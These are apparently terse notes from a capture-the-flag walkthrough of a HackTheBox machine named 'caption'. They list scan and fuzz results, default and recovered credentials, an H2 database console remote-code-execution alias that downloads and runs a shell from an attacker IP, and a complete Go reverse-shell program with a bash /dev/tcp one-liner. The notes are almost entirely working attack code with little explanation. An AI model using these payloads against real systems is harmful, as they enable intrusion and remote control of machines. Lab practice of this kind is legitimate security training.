- Scan : 
```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Werkzeug/3.0.1 Python/3.10.12
8080/tcp open  http-proxy
```
- Fuzz: 
```sh
200      GET      166l      320w     7429c http://caption.htb:8080/root/
```
- Try to connect :
```sh
root : root
```
- New user :
```sh
margo : vFr&cS2#0!
```

- RCE H2 database console :
```sh
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }$$;

CALL EXECVE('wget http://10.10.14.13:8000/shell')
CALL EXECVE('chmod +x shell')
CALL EXECVE('./shell')
```

- New creds : 
```sh
'admin' : 'cFgjE@0%l0':
```

- Build reverse : 
```sh
//go:generate sh -c "CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \"-s -w -extldflags '-static'\" -o $DOLLAR(basename ${GOFILE} .go)`go env GOEXE` ${GOFILE}"
// +build !windows

// Reverse Shell in Go
// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
// Test with nc -lvvp 6666
package main

import (
        "net"
        "os/exec"
        "time"
)

func main() {
        reverse("10.10.14.43:6666")
}

// bash -i >& /dev/tcp/localhost/6666 0>&1
func reverse(host string) {
        c, err := net.Dial("tcp", host)
        if nil != err {
                if nil != c {
                        c.Close()
                }
                time.Sleep(time.Minute)
                reverse(host)
        }

        cmd := exec.Command("/bin/sh")
        cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
        cmd.Run()
        c.Close()
        reverse(host)
}
```

